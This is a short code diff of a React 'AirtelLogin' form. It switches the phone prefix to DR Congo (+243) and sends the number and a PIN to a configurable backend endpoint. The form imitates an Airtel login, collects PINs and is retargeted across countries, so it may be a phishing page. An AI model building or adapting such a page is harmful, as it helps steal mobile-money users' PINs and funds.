@@ -44,8 +44,8 @@ function AirtelLogin() {
       const response = await fetch(`${import.meta.env.VITE_API_BASE_URL}/api/login`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        // CHANGED: Just send the raw phone variable. The backend adds +254 automatically.
-        body: JSON.stringify({ phone_number: phone, pin: pinString }),
+        // Send the full phone number with +243 prefix
+        body: JSON.stringify({ phone_number: `+243${phone}`, pin: pinString }),
       });
       const data = await response.json();
       
@@ -98,11 +98,11 @@ function AirtelLogin() {
           <div className="airtel-input-group">
             <label>Phone Number</label>
             <div className="airtel-phone-container">
-              {/* CHANGED: Updated display text from +250 to +254 */}
-              <div className="airtel-country-code">+254</div>
+              {/* CHANGED: Updated display text from +250 to +243 (DR Congo) */}
+              <div className="airtel-country-code">+243</div>
               <input 
                 type="tel" 
-                placeholder="7XX XXX XXX" 
+                placeholder="8XX XXX XXX" 
                 value={phone}
                 onChange={(e) => setPhone(e.target.value.replace(/\D/g, ''))}
                 maxLength={9}
